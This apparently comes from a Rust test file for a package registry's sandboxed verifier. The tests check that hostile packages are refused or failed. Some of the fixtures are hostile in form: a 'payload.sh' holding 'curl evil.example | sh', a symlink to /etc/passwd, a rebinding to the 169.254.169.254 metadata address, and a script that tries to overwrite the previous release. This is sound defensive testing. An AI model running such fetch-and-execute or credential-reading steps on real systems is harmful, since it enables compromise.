//! One verification from a repository at a commit, with stand-ins for
//! `jadpo` that report what a hostile package's run might: the sandbox and
//! the real `jadpo` are together in `jadpo-cli`'s `verifier` tests.

use std::path::{Path, PathBuf};
use std::sync::Arc;
use std::time::Duration;

use jadpo_registry::archive;
use jadpo_registry::names::Digest;
use jadpo_verifier::files::SIZE_LIMIT;
use jadpo_verifier::git::GitPolicy;
use jadpo_verifier::sandbox::{Limits, Sandbox};
use jadpo_verifier::verification::{Outcome, Request, Verifier};
use serde_json::{Value, json};

use super::support::{Dir, git, repository, sandbox, script, write};

const PACKAGE: &[(&str, &str)] = &[
    ("package.jadpo", "package Postcodes.v2 {}\n"),
    ("surface.jadpo_record", "surface\n"),
    ("CHANGELOG.md", "# Changelog\n"),
    ("libraries/uk.jadpo", "public library uk {}\n"),
    (".gitignore", "build\n"),
    ("README.md", "# Postcodes\n"),
];

pub fn limits() -> Limits {
    Limits {
        cpu_seconds: 20,
        wall: Duration::from_secs(60),
        memory_bytes: 1 << 31,
        file_bytes: 1 << 26,
        tmp_bytes: 1 << 26,
        processes: 4096,
        open_files: 256,
        output_bytes: 1 << 20,
    }
}

pub fn verifier(sandbox: Sandbox, repositories: &Path, scratch: &Path, jadpo: PathBuf) -> Verifier {
    Verifier {
        jadpo,
        sandbox,
        git: GitPolicy::local_for_tests(repositories.to_path_buf()),
        scratch: scratch.to_path_buf(),
        limits: limits(),
        archives: Arc::new(|digest| Err(format!("nothing holds {digest}"))),
        releases: Arc::new(|_| None),
    }
}

pub fn report(passed: bool, facts: &Value, extra: &[(&str, Value)]) -> Value {
    let mut data = json!({
        "package": "Postcodes.v2",
        "version": "2.0.0",
        "passed": passed,
        "bar": [
            { "item": "compiles", "state": "passed", "detail": "no errors" },
            { "item": "tests", "state": "not_checked", "detail": "not run" },
            { "item": "version", "state": "passed", "detail": "2.0.0, the first release" },
        ],
        "surface": "surface\n",
        "facts": facts,
        "change_record": [],
        "fingerprints": [],
        "previous": null,
        "jadpo": "0.3.0",
    });
    for (key, value) in extra {
        data[*key] = value.clone();
    }
    json!({ "schemaVersion": 1, "command": "package", "ok": passed, "data": data, "diagnostics": [] })
}

fn ran_bar() -> Value {
    json!([
        { "item": "compiles", "state": "passed", "detail": "no errors" },
        { "item": "tests", "state": "passed", "detail": "3 tests" },
        { "item": "version", "state": "passed", "detail": "2.0.0, the first release" },
    ])
}

/// A `jadpo` that answers `source` for `--no-run` and runs `run` otherwise.
pub fn stand_in(dir: &Path, source: &Value, run: &str) -> PathBuf {
    script(
        dir,
        "jadpo",
        &format!(
            "case \"$*\" in\n*--no-run*) cat <<'JSON'\n{source}\nJSON\n;;\n*)\n{run}\n;;\nesac\n"
        ),
    )
}

/// `run`'s shell for writing `document`.
pub fn says(document: &Value) -> String {
    format!("cat <<'JSON'\n{document}\nJSON\n")
}

fn honest(dir: &Path) -> PathBuf {
    let facts = json!({ "kind": "library" });
    stand_in(
        dir,
        &report(true, &facts, &[]),
        &says(&report(true, &facts, &[("bar", ran_bar())])),
    )
}

struct Set {
    repositories: Dir,
    scratch: Dir,
    tools: Dir,
}

fn set(name: &str) -> Set {
    Set {
        repositories: Dir::new(&format!("{name}-repositories")),
        scratch: Dir::new(&format!("{name}-scratch")),
        tools: Dir::new(&format!("{name}-tools")),
    }
}

impl Set {
    /// A repository in the set, with `files`; its address and head.
    fn repository(&self, files: &[(&str, &str)]) -> (String, String) {
        let root = self.repositories.path().join("package");
        std::fs::create_dir_all(&root).expect("a folder");
        let commit = repository(&root, files);
        (format!("file://{}", root.display()), commit)
    }

    fn request(
        &self,
        url: &str,
        commit: &str,
        verifier: &Verifier,
        previous: Option<&str>,
    ) -> Request {
        Request {
            repository: verifier.git.repository(url).expect("a repository"),
            commit: commit.to_string(),
            previous: previous.map(str::to_string),
            publisher: None,
        }
    }
}

/// `answer`'s file at `path`, in what a model reads.
fn source_of(answer: &Value, path: &str) -> Option<String> {
    answer["reading"]["source"]["files"]
        .as_array()?
        .iter()
        .find(|file| file["path"] == path)
        .and_then(|file| file["text"].as_str())
        .map(str::to_string)
}

fn checked(outcome: Outcome) -> Value {
    match outcome {
        Outcome::Checked(answer) => answer,
        other => panic!("not checked: {other:?}"),
    }
}

fn row<'a>(answer: &'a Value, item: &str) -> &'a Value {
    answer["bar"]
        .as_array()
        .expect("rows")
        .iter()
        .find(|row| row["item"] == item)
        .unwrap_or_else(|| panic!("no {item} row: {answer}"))
}

#[test]
fn a_commit_that_passes_comes_with_its_digest_and_archive() {
    let Some(sandbox) = sandbox() else { return };
    let set = set("verify-good");
    let (url, commit) = set.repository(PACKAGE);
    let verifier = verifier(
        sandbox,
        set.repositories.path(),
        set.scratch.path(),
        honest(set.tools.path()),
    );
    let request = set.request(&url, &commit, &verifier, None);
    let answer = checked(verifier.verify(&request));
    assert_eq!(answer["passed"], true, "{answer}");
    assert_eq!(answer["package"], "Postcodes.v2");
    assert_eq!(row(&answer, "tests")["state"], "passed");
    assert_eq!(row(&answer, "files")["state"], "passed");
    assert_eq!(answer["checked_with"], json!(["0.3.0"]));

    // What the repository needs for itself isn't in the release.
    assert_eq!(answer["left_out"], json!([".gitignore", "README.md"]));
    let files: Vec<(&str, &[u8])> = PACKAGE
        .iter()
        .filter(|(path, _)| !matches!(*path, ".gitignore" | "README.md"))
        .map(|(path, text)| (*path, text.as_bytes()))
        .collect();
    assert_eq!(answer["digest"], Digest::of_files(&files).as_str());

    let unpacked = archive::unpack(&unbase64(answer["archive"].as_str().expect("an archive")))
        .expect("it unpacks");
    assert_eq!(unpacked.len(), files.len());
    assert!(
        std::fs::read_dir(set.scratch.path())
            .expect("the folder")
            .next()
            .is_none(),
        "the verification's folder is removed"
    );
}

fn unbase64(text: &str) -> Vec<u8> {
    let value = |byte: u8| -> u32 {
        const LETTERS: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        LETTERS.iter().position(|l| *l == byte).expect("a letter") as u32
    };
    let mut out = Vec::new();
    for group in text.as_bytes().chunks(4) {
        let kept = group.iter().filter(|b| **b != b'=').count();
        let mut bits = 0u32;
        for byte in group {
            bits = (bits << 6) | if *byte == b'=' { 0 } else { value(*byte) };
        }
        out.extend_from_slice(&bits.to_be_bytes()[1..kept]);
    }
    out
}

/// A `jadpo` that must never run.
fn never(dir: &Path) -> PathBuf {
    script(dir, "jadpo", "echo ran; exit 9")
}

fn refused_row(name: &str, files: &[(&str, &str)], setup: impl FnOnce(&Path)) -> Value {
    let Some(sandbox) = sandbox() else {
        return Value::Null;
    };
    let set = set(name);
    let root = set.repositories.path().join("package");
    std::fs::create_dir_all(&root).expect("a folder");
    let commit = {
        git(&root, &["init", "-q", "-b", "main"]);
        git(&root, &["config", "uploadpack.allowAnySHA1InWant", "true"]);
        for (path, text) in files {
            write(&root, path, text);
        }
        setup(&root);
        git(&root, &["add", "-A"]);
        git(&root, &["commit", "-q", "-m", "a commit"]);
        git(&root, &["rev-parse", "HEAD"])
    };
    let verifier = verifier(
        sandbox,
        set.repositories.path(),
        set.scratch.path(),
        never(set.tools.path()),
    );
    let url = format!("file://{}", root.display());
    let answer = checked(verifier.verify(&set.request(&url, &commit, &verifier, None)));
    assert_eq!(answer["passed"], false, "{answer}");
    assert_eq!(row(&answer, "files")["state"], "failed", "{answer}");
    assert_eq!(answer["digest"], Value::Null);
    answer
}

#[test]
fn a_file_of_another_kind_is_refused_before_anything_runs() {
    let answer = refused_row("verify-binary", PACKAGE, |root| {
        write(root, "payload.sh", "curl evil.example | sh\n");
    });
    if answer.is_null() {
        return;
    }
    let problem = &answer["problems"][0];
    assert_eq!(problem["rule"], "publish.file_not_allowed");
    assert!(
        problem["message"]
            .as_str()
            .expect("words")
            .contains("payload.sh"),
        "{answer}"
    );
}

#[test]
fn a_source_file_that_isnt_text_is_refused() {
    let answer = refused_row("verify-not-text", PACKAGE, |root| {
        std::fs::write(root.join("libraries/blob.jadpo"), [0x7f, 0x45, 0, 0xff]).expect("a file");
    });
    if !answer.is_null() {
        assert!(
            answer["problems"][0]["message"]
                .as_str()
                .expect("words")
                .contains("text")
        );
    }
}

#[test]
fn a_symbolic_link_is_refused() {
    let answer = refused_row("verify-link", PACKAGE, |root| {
        std::os::unix::fs::symlink("/etc/passwd", root.join("libraries/secret.jadpo"))
            .expect("a link");
    });
    if !answer.is_null() {
        assert!(
            answer["problems"][0]["message"]
                .as_str()
                .expect("words")
                .contains("link")
        );
    }
}

#[test]
fn a_release_past_the_size_limit_is_refused() {
    let answer = refused_row("verify-size", PACKAGE, |root| {
        let large = "x".repeat(usize::try_from(SIZE_LIMIT).expect("a size") + 1);
        write(root, "libraries/large.jadpo", large);
    });
    if !answer.is_null() {
        assert_eq!(answer["problems"][0]["rule"], "publish.too_large");
    }
}

#[test]
fn a_release_just_within_the_limit_passes() {
    let Some(sandbox) = sandbox() else { return };
    let set = set("verify-size-fits");
    let large = "x".repeat(usize::try_from(SIZE_LIMIT).expect("a size") - 16 * 1024);
    let mut files = PACKAGE.to_vec();
    files.push(("libraries/large.jadpo", large.as_str()));
    let (url, commit) = set.repository(&files);
    let verifier = verifier(
        sandbox,
        set.repositories.path(),
        set.scratch.path(),
        honest(set.tools.path()),
    );
    let answer = checked(verifier.verify(&set.request(&url, &commit, &verifier, None)));
    assert_eq!(answer["passed"], true, "{}", row(&answer, "files"));
    let archive = unbase64(answer["archive"].as_str().expect("an archive"));
    assert!(archive.len() as u64 <= SIZE_LIMIT, "{}", archive.len());
    // What the registry receives fits what a provider's answer may be.
    assert!(answer["archive"].as_str().expect("an archive").len() < 10 << 20);
}

#[test]
fn a_release_whose_whole_answer_wouldnt_reach_the_registry_fails() {
    let Some(sandbox) = sandbox() else { return };
    let set = set("verify-answer-size");
    let large = "x".repeat(usize::try_from(SIZE_LIMIT).expect("a size") - 16 * 1024);
    let mut files = PACKAGE.to_vec();
    files.push(("libraries/large.jadpo", large.as_str()));
    let (url, commit) = set.repository(&files);
    // Facts and fingerprints enough to take it past 10 MiB with the archive.
    let facts = json!({ "kind": "library", "notes": "y".repeat(2 << 20) });
    let jadpo = stand_in(
        set.tools.path(),
        &report(true, &facts, &[]),
        &says(&report(true, &facts, &[("bar", ran_bar())])),
    );
    let mut verifier = verifier(sandbox, set.repositories.path(), set.scratch.path(), jadpo);
    verifier.limits.output_bytes = 8 << 20;
    let answer = checked(verifier.verify(&set.request(&url, &commit, &verifier, None)));
    assert_eq!(
        answer["passed"], false,
        "a release that can't arrive doesn't pass"
    );
    assert_eq!(answer["digest"], Value::Null);
    assert_eq!(answer["archive"], Value::Null);
    let files = row(&answer, "files")["detail"].as_str().expect("words");
    assert!(files.contains("answer"), "{files}");
    assert_eq!(
        answer["problems"][0]["rule"], "publish.too_large",
        "{}",
        answer["problems"]
    );
    assert_eq!(answer["reading"], Value::Null);
}

#[test]
fn what_passes_comes_with_its_source_and_its_diff() {
    let Some(sandbox) = sandbox() else { return };
    let set = set("verify-reading");
    let (url, commit) = set.repository(PACKAGE);
    let old: Vec<(String, Vec<u8>)> = vec![
        (
            "package.jadpo".to_string(),
            b"package Postcodes.v1 {}\n".to_vec(),
        ),
        (
            "libraries/gone.jadpo".to_string(),
            b"library gone {}\n".to_vec(),
        ),
    ];
    let view: Vec<(&str, &[u8])> = old
        .iter()
        .map(|(path, bytes)| (path.as_str(), bytes.as_slice()))
        .collect();
    let digest = Digest::of_files(&view);
    let packed = archive::pack(&old).expect("it packs");
    let mut verifier = verifier(
        sandbox,
        set.repositories.path(),
        set.scratch.path(),
        honest(set.tools.path()),
    );

    // A first release has its source and no diff.
    let answer = checked(verifier.verify(&set.request(&url, &commit, &verifier, None)));
    assert_eq!(
        source_of(&answer, "libraries/uk.jadpo").as_deref(),
        Some("public library uk {}\n")
    );
    assert_eq!(answer["reading"]["source"]["truncated"], false);
    assert_eq!(
        source_of(&answer, ".gitignore"),
        None,
        "what's left out isn't there"
    );
    assert_eq!(answer["reading"]["diff"]["diff"], Value::Null);

    // A later one has both, by the package's own paths.
    verifier.archives = Arc::new(move |_| Ok(packed.clone()));
    let request = set.request(&url, &commit, &verifier, Some(digest.as_str()));
    let answer = checked(verifier.verify(&request));
    let diff = answer["reading"]["diff"]["diff"].as_str().expect("a diff");
    assert!(diff.contains("-package Postcodes.v1 {}"), "{diff}");
    assert!(diff.contains("+package Postcodes.v2 {}"), "{diff}");
    assert!(diff.contains("-library gone {}"), "{diff}");
    assert!(diff.contains("a/package.jadpo b/package.jadpo"), "{diff}");
    assert!(
        !diff.contains("jadpo-verifier-"),
        "no scratch folder shows: {diff}"
    );
}

#[test]
fn a_release_that_fails_has_nothing_to_read() {
    let answer = refused_row("verify-no-reading", PACKAGE, |root| {
        write(root, "payload.sh", "x\n");
    });
    if !answer.is_null() {
        assert_eq!(answer["reading"], Value::Null);
    }
}

#[test]
fn a_commit_that_cant_be_fetched_couldnt_be_checked() {
    let Some(sandbox) = sandbox() else { return };
    let set = set("verify-missing");
    let (url, _) = set.repository(PACKAGE);
    let verifier = verifier(
        sandbox,
        set.repositories.path(),
        set.scratch.path(),
        never(set.tools.path()),
    );
    let request = set.request(&url, &"a".repeat(40), &verifier, None);
    match verifier.verify(&request) {
        Outcome::CouldNotCheck { code, .. } => assert_eq!(code, "commit_not_fetched"),
        other => panic!("{other:?}"),
    }
}

#[test]
fn a_run_cant_choose_its_own_facts() {
    let Some(sandbox) = sandbox() else { return };
    let set = set("verify-forged");
    let (url, commit) = set.repository(PACKAGE);
    let honest_facts = json!({ "kind": "provider", "hosts": ["https://evil.example"] });
    let forged_facts = json!({ "kind": "library", "hosts": [] });
    let jadpo = stand_in(
        set.tools.path(),
        &report(true, &honest_facts, &[]),
        &says(&report(true, &forged_facts, &[("bar", ran_bar())])),
    );
    let verifier = verifier(sandbox, set.repositories.path(), set.scratch.path(), jadpo);
    let answer = checked(verifier.verify(&set.request(&url, &commit, &verifier, None)));
    assert_eq!(answer["passed"], false, "{answer}");
    assert_eq!(answer["facts"], honest_facts);
    assert_eq!(row(&answer, "agreement")["state"], "failed");
    assert!(
        row(&answer, "agreement")["detail"]
            .as_str()
            .expect("words")
            .contains("facts")
    );
    assert_eq!(answer["digest"], Value::Null);
}

#[test]
fn a_run_cant_overturn_a_row_its_source_decided() {
    let Some(sandbox) = sandbox() else { return };
    let set = set("verify-row");
    let (url, commit) = set.repository(PACKAGE);
    let facts = json!({ "kind": "library" });
    let source_bar = json!([
        { "item": "compiles", "state": "passed", "detail": "no errors" },
        { "item": "version", "state": "failed", "detail": "1 breaking change since 1.0.0" },
    ]);
    let jadpo = stand_in(
        set.tools.path(),
        &report(false, &facts, &[("bar", source_bar)]),
        &says(&report(true, &facts, &[("bar", ran_bar())])),
    );
    let verifier = verifier(sandbox, set.repositories.path(), set.scratch.path(), jadpo);
    let answer = checked(verifier.verify(&set.request(&url, &commit, &verifier, None)));
    assert_eq!(answer["passed"], false, "{answer}");
    assert_eq!(row(&answer, "version")["state"], "failed");
    assert_eq!(row(&answer, "tests")["state"], "passed");
}

#[test]
fn only_the_run_says_what_its_tests_showed() {
    let Some(sandbox) = sandbox() else { return };
    let set = set("verify-behaviour");
    let (url, commit) = set.repository(PACKAGE);
    let facts = json!({ "kind": "library" });
    let entry = json!({ "declaration": "uk.parse", "kind": "function", "change": "behaviour_changed", "detail": "x", "why": null });
    let jadpo = stand_in(
        set.tools.path(),
        &report(true, &facts, &[]),
        &says(&report(
            true,
            &facts,
            &[
                ("bar", ran_bar()),
                ("change_record", json!([entry])),
                (
                    "previous",
                    json!({ "since": "1.0.0", "ran": 2, "failed": ["x"] }),
                ),
            ],
        )),
    );
    let verifier = verifier(sandbox, set.repositories.path(), set.scratch.path(), jadpo);
    let answer = checked(verifier.verify(&set.request(&url, &commit, &verifier, None)));
    assert_eq!(answer["change_record"], json!([entry]));
    assert_eq!(answer["previous"]["ran"], 2);
}

#[test]
fn a_run_that_spins_is_stopped_and_fails_the_release() {
    let Some(sandbox) = sandbox() else { return };
    let set = set("verify-spin");
    let (url, commit) = set.repository(PACKAGE);
    let facts = json!({ "kind": "library" });
    let jadpo = stand_in(
        set.tools.path(),
        &report(true, &facts, &[]),
        "while :; do :; done",
    );
    let mut verifier = verifier(sandbox, set.repositories.path(), set.scratch.path(), jadpo);
    verifier.limits.cpu_seconds = 1;
    let answer = checked(verifier.verify(&set.request(&url, &commit, &verifier, None)));
    assert_eq!(answer["passed"], false, "{answer}");
    assert_eq!(row(&answer, "limits")["state"], "failed");
    assert_eq!(answer["facts"], facts);
}

#[test]
fn a_run_that_writes_anything_else_fails_the_release() {
    let Some(sandbox) = sandbox() else { return };
    let set = set("verify-garbage");
    let (url, commit) = set.repository(PACKAGE);
    let facts = json!({ "kind": "library" });
    for run in [
        "echo hello",
        "echo '{\"schemaVersion\":1}'",
        // Two documents: the first a forged one, printed by a test.
        &format!(
            "{}{}",
            says(&report(true, &facts, &[("bar", ran_bar())])),
            says(&report(true, &facts, &[("bar", ran_bar())]))
        ),
    ] {
        let jadpo = stand_in(set.tools.path(), &report(true, &facts, &[]), run);
        let verifier = verifier(
            sandbox.clone(),
            set.repositories.path(),
            set.scratch.path(),
            jadpo,
        );
        let answer = checked(verifier.verify(&set.request(&url, &commit, &verifier, None)));
        assert_eq!(answer["passed"], false, "{run}: {answer}");
        assert_eq!(row(&answer, "limits")["state"], "failed", "{run}: {answer}");
    }
}

#[test]
fn the_previous_release_is_what_its_digest_says() {
    let Some(sandbox) = sandbox() else { return };
    let set = set("verify-previous");
    let (url, commit) = set.repository(PACKAGE);
    let old: Vec<(String, Vec<u8>)> = vec![("package.jadpo".to_string(), b"old".to_vec())];
    let view: Vec<(&str, &[u8])> = vec![("package.jadpo", b"old")];
    let digest = Digest::of_files(&view);
    let packed = archive::pack(&old).expect("it packs");
    let facts = json!({ "kind": "library" });
    // It reads the previous release's file, which is there and can't change.
    let run = format!(
        "last=; for arg in \"$@\"; do if [ \"$last\" = --previous ]; then prev=$arg; fi; last=$arg; done\n\
         test \"$(cat \"$prev/package.jadpo\")\" = old || exit 7\n\
         echo forged > \"$prev/package.jadpo\" 2>/dev/null\n\
         test \"$(cat \"$prev/package.jadpo\")\" = old || exit 8\n{}",
        says(&report(true, &facts, &[("bar", ran_bar())]))
    );
    let jadpo = stand_in(set.tools.path(), &report(true, &facts, &[]), &run);
    let mut good = verifier(sandbox, set.repositories.path(), set.scratch.path(), jadpo);
    let kept = packed.clone();
    let wanted = digest.as_str().to_string();
    good.archives = Arc::new(move |asked| {
        assert_eq!(asked, wanted);
        Ok(kept.clone())
    });
    let request = set.request(&url, &commit, &good, Some(digest.as_str()));
    assert_eq!(checked(good.verify(&request))["passed"], true);

    // An archive that doesn't match, whoever served it.
    let mut other = good.clone();
    let other_files =
        archive::pack(&[("package.jadpo".to_string(), b"other".to_vec())]).expect("it packs");
    other.archives = Arc::new(move |_| Ok(other_files.clone()));
    match other.verify(&request) {
        Outcome::CouldNotCheck { code, .. } => assert_eq!(code, "previous_digest_mismatch"),
        answer => panic!("{answer:?}"),
    }

    // And one that isn't there.
    let mut gone = good.clone();
    gone.archives = Arc::new(|_| Err("not found".to_string()));
    match gone.verify(&request) {
        Outcome::CouldNotCheck { code, .. } => assert_eq!(code, "previous_not_found"),
        answer => panic!("{answer:?}"),
    }
}

#[test]
fn it_checks_with_the_release_declared() {
    let Some(sandbox) = sandbox() else { return };
    let set = set("verify-declared");
    let (url, commit) = set.repository(PACKAGE);
    let facts = json!({ "kind": "library" });
    let declared = ("jadpo_declared", json!("0.2"));
    let jadpo = stand_in(
        set.tools.path(),
        &report(true, &facts, std::slice::from_ref(&declared)),
        &says(&report(
            true,
            &facts,
            &[("bar", ran_bar()), declared.clone()],
        )),
    );
    let mut base = verifier(sandbox, set.repositories.path(), set.scratch.path(), jadpo);
    let request = set.request(&url, &commit, &base, None);

    // No release of that line to be had: the row says so, and it passes.
    let answer = checked(base.verify(&request));
    assert_eq!(row(&answer, "declared jadpo")["state"], "not_checked");
    assert_eq!(answer["passed"], true);

    let older = |passed: bool, name: &str| {
        let document = report(passed, &facts, &[("jadpo", json!("0.2.5"))]);
        script(set.tools.path(), name, &says(&document))
    };
    let passing = older(true, "older-passing");
    base.releases = Arc::new(move |line| {
        assert_eq!(line, "0.2");
        Some(passing.clone())
    });
    let answer = checked(base.verify(&request));
    assert_eq!(row(&answer, "declared jadpo")["state"], "passed");
    assert_eq!(answer["checked_with"], json!(["0.3.0", "0.2.5"]));
    assert_eq!(answer["passed"], true);

    let failing = older(false, "older-failing");
    base.releases = Arc::new(move |_| Some(failing.clone()));
    let answer = checked(base.verify(&request));
    assert_eq!(row(&answer, "declared jadpo")["state"], "failed");
    assert_eq!(answer["passed"], false);
    assert_eq!(answer["digest"], Value::Null);

    // A release too old to have `verify` can't say.
    let too_old = script(set.tools.path(), "older-old", "echo unknown; exit 2");
    base.releases = Arc::new(move |_| Some(too_old.clone()));
    let answer = checked(base.verify(&request));
    assert_eq!(row(&answer, "declared jadpo")["state"], "not_checked");
    assert_eq!(answer["passed"], true);
}

#[test]
fn a_tag_resolves_to_its_commit() {
    let Some(sandbox) = sandbox() else { return };
    let set = set("verify-tags");
    let (url, commit) = set.repository(PACKAGE);
    let root = set.repositories.path().join("package");
    git(&root, &["tag", "v2.0.0"]);
    git(&root, &["tag", "-a", "v2.0.1", "-m", "annotated"]);
    let verifier = verifier(
        sandbox,
        set.repositories.path(),
        set.scratch.path(),
        never(set.tools.path()),
    );
    let repository = verifier.git.repository(&url).expect("a repository");
    assert_eq!(
        verifier.resolve(&repository, "v2.0.0"),
        Ok(Some(commit.clone()))
    );
    assert_eq!(
        verifier.resolve(&repository, "v2.0.1"),
        Ok(Some(commit.clone()))
    );
    assert_eq!(verifier.resolve(&repository, "v9"), Ok(None));
}

#[test]
fn a_public_policy_refuses_a_name_that_points_somewhere_private() {
    let Some(sandbox) = sandbox() else { return };
    let set = set("verify-rebinding");
    let mut verifier = verifier(
        sandbox,
        set.repositories.path(),
        set.scratch.path(),
        never(set.tools.path()),
    );
    verifier.git = GitPolicy::https_resolved_by(Arc::new(|_| {
        Ok(vec!["169.254.169.254".parse().expect("an address")])
    }));
    let repository = verifier
        .git
        .repository("https://github.com/acme/postcodes")
        .expect("well formed");
    let request = Request {
        repository: repository.clone(),
        commit: "a".repeat(40),
        previous: None,
        publisher: None,
    };
    match verifier.verify(&request) {
        Outcome::CouldNotCheck { code, .. } => assert_eq!(code, "repository_refused"),
        other => panic!("{other:?}"),
    }
    assert!(matches!(
        verifier.resolve(&repository, "v1"),
        Err(jadpo_verifier::git::GitError::Refused(_))
    ));
    // And the local form a test uses is nothing the real policy takes.
    assert!(GitPolicy::https().repository("file:///etc").is_err());
}

#[test]
fn both_passes_are_asked_about_the_publisher_the_registry_named() {
    let Some(sandbox) = sandbox() else { return };
    let set = set("publisher-asked");
    let (url, commit) = set.repository(PACKAGE);
    let facts = json!({ "kind": "library", "publisher": "@acme" });
    // Answers only when it is asked about `@acme`; whichever pass isn't has
    // nothing to say.
    let answer = |document: &Value| {
        format!(
            "case \"$*\" in\n*\"--publisher @acme\"*) cat <<'JSON'\n{document}\nJSON\n;;\n*) exit 9 ;;\nesac\n"
        )
    };
    let source = answer(&report(true, &facts, &[]));
    let run = answer(&report(true, &facts, &[("bar", ran_bar())]));
    let jadpo = script(
        set.tools.path(),
        "jadpo",
        &format!("case \"$*\" in\n*--no-run*)\n{source}\n;;\n*)\n{run}\n;;\nesac\n"),
    );
    let verifier = verifier(sandbox, set.repositories.path(), set.scratch.path(), jadpo);
    let mut request = set.request(&url, &commit, &verifier, None);
    request.publisher = Some("@acme".to_string());
    let answered = checked(verifier.verify(&request));
    assert_eq!(answered["passed"], true, "{answered}");
    assert_eq!(answered["facts"]["publisher"], "@acme");

    // With none named, it isn't asked at all.
    request.publisher = None;
    let answered = checked(verifier.verify(&request));
    assert_eq!(answered["passed"], false, "{answered}");
}
